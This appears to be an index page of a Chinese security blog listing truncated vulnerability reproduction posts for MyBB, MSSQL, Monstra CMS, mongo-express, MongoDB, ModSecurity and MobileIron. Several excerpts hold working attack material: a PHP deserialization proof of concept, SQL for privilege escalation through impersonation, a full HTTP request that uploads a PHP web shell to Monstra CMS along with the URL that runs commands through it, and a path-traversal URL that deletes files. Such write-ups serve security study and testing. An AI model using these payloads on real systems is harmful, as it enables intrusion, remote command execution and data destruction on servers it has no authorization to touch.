@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/60/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-MyBB/MyBB _= 1.8.3 rce漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.811Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MyBB-lt-1-8-3-RCE"><a href="#MyBB-lt-1-8-3-RCE" class="headerlink" title="MyBB&lt;=1.8.3 RCE"></a>MyBB&lt;=1.8.3 RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在使用精心编制的对象的<code>__wakeup()</code>魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHP 5.6 &lt; 5.6.30</p>
+<p>MyBB&lt;=1.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>gmp.c</p>
+<pre><code>static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* &#123;&#123;&#123; */
+    &#123;
+        ...
+        ALLOC_INIT_ZVAL(zv_ptr);
+        if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
+            || Z_TYPE_P(zv_ptr) != IS_ARRAY
+        ) &#123;
+            zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
+            goto exit;
+        &#125;
+
+        if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) &#123;
+            zend_hash_copy(
+                zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
+                (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
+            );
+        &#125;
+
+zend\_object\_handlers.c
+
+    ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* &#123;&#123;&#123; */
+    &#123;
+        zend_object *zobj;
+        zobj = Z_OBJ_P(object);
+        if (!zobj->properties) &#123;
+            rebuild_object_properties(zobj);
+        &#125;
+        return zobj->properties;
+    &#125;
+
+攻击者可以将`**object`更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过`Z_OBJ_P`访问存储在对象库中的任何对象。这意味着攻击者将能够通过`zend_hash_copy()`更新对象中的任何属性。从而引发了一系列安全问题。
+
+下面这段代码可以验证这个漏洞
+
+    <?php
+
+    class obj
+    &#123;
+        var $ryat;
+
+        function __wakeup()
+        &#123;
+            $this->ryat = 1;
+        &#125;
+    &#125;
+
+    $obj = new stdClass;
+    $obj->aa = 1;
+    $obj->bb = 2;
+
+    $inner = 's:1:"1";a:3:&#123;s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:&#123;s:4:"ryat";R:2;&#125;&#125;&#39;;
+$exploit = &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#39;.strlen($inner).&#39;:&#123;&#39;.$inner.&#39;&#125;&#125;&#39;;
+$x = unserialize($exploit);
+var_dump($obj);
+
+?&gt;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsp000buy8v1hqmiaixd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Mssql/Mssql 模拟登录提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.706Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Mssql-模拟登录提权"><a href="#Mssql-模拟登录提权" class="headerlink" title="Mssql 模拟登录提权"></a>Mssql 模拟登录提权</h1><h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</p>
+<h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><h4 id="1-sa用户登录创建4个用户"><a href="#1-sa用户登录创建4个用户" class="headerlink" title="1.sa用户登录创建4个用户"></a>1.sa用户登录创建4个用户</h4><pre><code>-- Create login 1
+CREATE LOGIN MyUser1 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 2
+CREATE LOGIN MyUser2 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 3
+CREATE LOGIN MyUser3 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 4
+CREATE LOGIN MyUser4 WITH PASSWORD = &#39;MyPassword!&#39;;
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId24.png" alt="1.png"></p>
+<h4 id="2-赋予用户MyUser1权限来模拟-MyUser2-MyUser3-及sa"><a href="#2-赋予用户MyUser1权限来模拟-MyUser2-MyUser3-及sa" class="headerlink" title="2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa"></a>2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa</h4><pre><code>USE master;
+GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+GO
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId26.png" alt="2.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" data-id="cl5c2qsn900bqy8v1avz1hp0a" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Mssql/Mssql 受信用数据库提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mssql/Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.699Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Mssql-受信用数据库提权"><a href="#Mssql-受信用数据库提权" class="headerlink" title="Mssql 受信用数据库提权"></a>Mssql 受信用数据库提权</h1><h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>前提条件，我们获取sqlserver一个名为MyAppUser01<br>的用户密码，这个用户对MyTestdb01有db_owner权限，并且对MyTestdb01受信用，然后我们可以利用这个用户提权到syadmin权限</p>
+<p>测试服务器版本</p>
+<p><img src="/resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId22.png" alt="1.png"></p>
+<h2 id="0x02创建用户，受信用数据库"><a href="#0x02创建用户，受信用数据库" class="headerlink" title="0x02创建用户，受信用数据库"></a>0x02创建用户，受信用数据库</h2><h4 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h4><pre><code>CREATE DATABASE MyTestdb01
+SELECT suser_sname(owner_sid)
+FROM sys.databases
+WHERE name = &#39;MyTestdb01&#39;
+</code></pre>
+<p><img src="/resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId25.png" alt="2.png"></p>
+<h4 id="2-创建用户"><a href="#2-创建用户" class="headerlink" title="2.创建用户"></a>2.创建用户</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Mssql/Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mssql/Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" data-id="cl5c2qsn900bry8v11c95fwyc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Monstra CMS/（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.687Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-13384）Monstra-CMS-3-0-4-任意文件上传漏洞"><a href="#（CVE-2020-13384）Monstra-CMS-3-0-4-任意文件上传漏洞" class="headerlink" title="（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞"></a>（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Monstra CMS是乌克兰Sergey<br>Romanenko软件开发者的一套基于PHP的轻量级内容管理系统（CMS）。 Monstra<br>CMS<br>3.0.4版本中的index.php脚本存在安全漏洞，该漏洞源于程序没有正确验证文件扩展名。远程攻击者可借助特制HTTP请求利用该漏洞上载和执行任意PHP代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Monstra CMS 3.0.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>https://www.0-sec.org/monstra/admin/index.php?id=filesmanager&amp;path=uploads/</code></p>
+<pre><code>POST /monstra/admin/index.php?id=filesmanager HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 548
+Cache-Control: max-age=0
+Origin: https://www.0-sec.org
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytRfyCkYq8NvztDBf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://www.0-sec.org/monstra/admin/index.php?id=filesmanager
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7
+Cookie: PHPSESSID=eej6e0lqi191k2frqc2hl3v6d0; _ga=GA1.1.405623579.1579949328; _gid=GA1.1.2042923722.1579949328
+Connection: close
+
+------WebKitFormBoundarytRfyCkYq8NvztDBf
+Content-Disposition: form-data; name=&quot;csrf&quot;
+
+2e6ae2353998caa319aae262b113c6b3f17a9636
+------WebKitFormBoundarytRfyCkYq8NvztDBf
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php7&quot;
+Content-Type: application/octet-stream
+
+&lt;?php if(isset($_REQUEST[&#39;cmd&#39;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;
+
+
+------WebKitFormBoundarytRfyCkYq8NvztDBf
+Content-Disposition: form-data; name=&quot;upload_file&quot;
+
+Upload
+------WebKitFormBoundarytRfyCkYq8NvztDBf--
+</code></pre>
+<p><code>https://www.0-sec.org/monstra/public/uploads/shell.php7?cmd=id</code></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsed00boy8v1bvggacun" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Monstra CMS/Monstra CMS _= 3.0.4 任意文件删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Monstra%20CMS/Monstra%20CMS%20_=%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.683Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Monstra-CMS-lt-3-0-4-任意文件删除漏洞"><a href="#Monstra-CMS-lt-3-0-4-任意文件删除漏洞" class="headerlink" title="Monstra CMS &lt;= 3.0.4 任意文件删除漏洞"></a>Monstra CMS &lt;= 3.0.4 任意文件删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>慎用</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Monstra CMS &lt;= 3.0.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/admin/index.php?id=backup&amp;delete_file=/.......//./.......//./index.php&amp;token=f62369587a94433bb2c3c00264e8705171c6189f
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Monstra%20CMS/Monstra%20CMS%20_=%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Monstra%20CMS/Monstra%20CMS%20_=%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsec00bny8v1gimba0iq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Mongo express/（CVE-2019-10758）Mongo expres rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mongo%20express/%EF%BC%88CVE-2019-10758%EF%BC%89Mongo%20expres%20rce/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.661Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-10758）Mongo-expres-rce"><a href="#（CVE-2019-10758）Mongo-expres-rce" class="headerlink" title="（CVE-2019-10758）Mongo expres rce"></a>（CVE-2019-10758）Mongo expres rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞问题出在lib/bson.js中的toBSON()函数中，路由 /checkValid<br>从外部接收输入，并调用了存在 RCE<br>漏洞的代码，由此存在被攻击的风险，可在服务器上进行任意命令执行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>mongo-express &lt; 0.54.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2019-10758">https://github.com/ianxtianxt/CVE-2019-10758</a></p>
+<h4 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h4><pre><code>docker run -p 27017:27017 -d mongo
+npm install mongo-express@0.53.0 
+cd node_modules/mongo-express/ &amp;&amp; node app.js
+</code></pre>
+<h4 id="cURL-exploit"><a href="#cURL-exploit" class="headerlink" title="cURL exploit"></a>cURL exploit</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Mongo%20express/%EF%BC%88CVE-2019-10758%EF%BC%89Mongo%20expres%20rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mongo%20express/%EF%BC%88CVE-2019-10758%EF%BC%89Mongo%20expres%20rce/" data-id="cl5c2qslk00bpy8v1g4queibo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Mongo DB/Mongo DB未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mongo%20DB/Mongo%20DB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.630Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>MongoDB<br>默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb<br>端口（默认<br>27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p>
+<ul>
+<li><p>  使用默认 mongod 命令启动 Mongodb</p>
+</li>
+<li><p>  机器可以被公网访问</p>
+</li>
+<li><p>  在公网上开放了 Mongodb 端口</p>
+</li>
+<li><p>  数据库隐私泄露</p>
+</li>
+<li><p>  数据库被清空</p>
+</li>
+<li><p>  数据库运行缓慢</p>
+</li>
+</ul>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1. 扫描探测"></a>1. 扫描探测</h4><h4 id="2-下载："><a href="#2-下载：" class="headerlink" title="2. 下载："></a>2. 下载：</h4><p><a target="_blank" rel="noopener" href="http://nmap.org/svn/scripts/mongodb-info.nse">http://nmap.org/svn/scripts/mongodb-info.nse</a></p>
+<pre><code>nmap -p 27017 --script mongodb-info &lt;ip&gt;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Mongo%20DB/Mongo%20DB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mongo%20DB/Mongo%20DB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2qsbl00bmy8v1dgccf55p" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ModSecurity/（CVE-2019-19886）ModSecurity 拒绝服务漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ModSecurity/%EF%BC%88CVE-2019-19886%EF%BC%89ModSecurity%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.599Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-19886）ModSecurity-拒绝服务漏洞"><a href="#（CVE-2019-19886）ModSecurity-拒绝服务漏洞" class="headerlink" title="（CVE-2019-19886）ModSecurity 拒绝服务漏洞"></a>（CVE-2019-19886）ModSecurity 拒绝服务漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2020年1月20日，Trustwave<br>SpiderLabs公开了其维护的开源WAF引擎ModSecurity的1个拒绝服务（DoS）漏洞，漏洞编号为：CVE-2019-19886。此漏洞影响ModSecurity的3.0到3.0.3版本。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ModSecurity 3.0到3.0.3版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过Github项目的releases跟踪:<br><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/ModSecurity/releases">https://github.com/SpiderLabs/ModSecurity/releases</a></p>
+<p><img src="/resource/(CVE-2019-19886)ModSecurity%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>发现了airween的一个pr:<br><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/ModSecurity/pull/2201">https://github.com/SpiderLabs/ModSecurity/pull/2201</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ModSecurity/%EF%BC%88CVE-2019-19886%EF%BC%89ModSecurity%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ModSecurity/%EF%BC%88CVE-2019-19886%EF%BC%89ModSecurity%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsbl00bly8v1arae0fag" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-MobileIron/（CVE-2020-15505）MobileIron 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MobileIron/%EF%BC%88CVE-2020-15505%EF%BC%89MobileIron%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.571Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-15505）MobileIron-远程命令执行漏洞"><a href="#（CVE-2020-15505）MobileIron-远程命令执行漏洞" class="headerlink" title="（CVE-2020-15505）MobileIron 远程命令执行漏洞"></a>（CVE-2020-15505）MobileIron 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>MobileIron Sentry等都是美国思可信（MobileIron）公司的产品。MobileIron<br>Sentry是一款智能网关产品。MobileIron<br>Core是一款MobileIron平台的管理控制台组件。MobileIron<br>Connector是一款MobileIron平台的连接器组件。 MobileIron Core<br>10.6及之前版本、Connector 10.6及之前版本和Sentry<br>9.8及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MobileIron Core 10.6及之前版本、Connector 10.6及之前版本和Sentry<br>9.8及之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>https://www.0-sec.org/mifs/.;/services/LogService</code></p>
+<p><img src="/resource/(CVE-2020-15505)MobileIron%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="5.png"></p>
+<p>确认存在该漏洞位置连接。</p>
+<p>在vps执行</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/MobileIron/%EF%BC%88CVE-2020-15505%EF%BC%89MobileIron%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
